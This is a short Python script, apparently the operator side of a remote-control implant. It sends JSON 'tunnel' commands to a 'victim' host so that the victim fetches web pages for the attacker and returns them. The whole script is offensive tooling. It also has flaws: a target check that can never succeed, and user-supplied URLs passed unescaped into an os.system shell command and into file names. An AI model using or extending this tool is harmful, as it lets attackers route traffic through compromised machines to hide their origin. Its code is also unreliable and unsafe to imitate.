#!/usr/bin/python3

import requests;
import json;
import os;
import threading;
from sys import argv;
import time;

''' GLOBAL VARS '''
VICTIM = ["127.0.0.1",1337]; # (<ip_address>, <port_no.>)

''' FUNCTIONS '''
def menu():
	choices = ["tunnel", "quit"];
	print(" :: MENU ::");
	print(" - tunnel");
	print(" - quit");
	while True:
		inp = input("-> ").lstrip(" ").rstrip(" ");
		if inp in choices:
			return(inp);
			
def send(action,value):
	payload = json.dumps({"action":action,"value":value});
	vic_url = "http://"+VICTIM[0]+":"+str(VICTIM[1])+"";
	resp = requests.get(vic_url,data=payload);
	return(resp.content);

def tunnel():
	url = input("[address] -> ");
	print("Fetching....");
	start_time = time.time();
	bin_resp = send("tunnel",url);
	fetch_time = time.time() - start_time;
	print("Got response [in "+str(fetch_time)+" seconds]! Saving to "+url+".html");
	op_file = open(url+".html","wb");
	op_file.write(bin_resp);
	op_file.close();
	choice = input("Open Site? [y/n] : ");
	if choice == "y" or choice == "Y":
		threading.Thread(target=os.system("xdg-open "+url+".html 1> /dev/null"));
	return;

def get_target():
	while True:
		ip = input("Victim Address -> ");
		if ip.split(".") == 4:
			return(ip);

''' MAIN '''
if __name__ == "__main__":
	print("Starting attacker-side program....");
	run_flag = True;
	
	if len(argv) >= 2:
		VICTIM[0]=argv[1];
	else:
		VICTIM[0] = get_target();
		
	while run_flag == True:
		choice = menu();
		if choice == "tunnel":
			tunnel();
		elif choice == "quit":
			run_flag = False;
		print("\n\n");
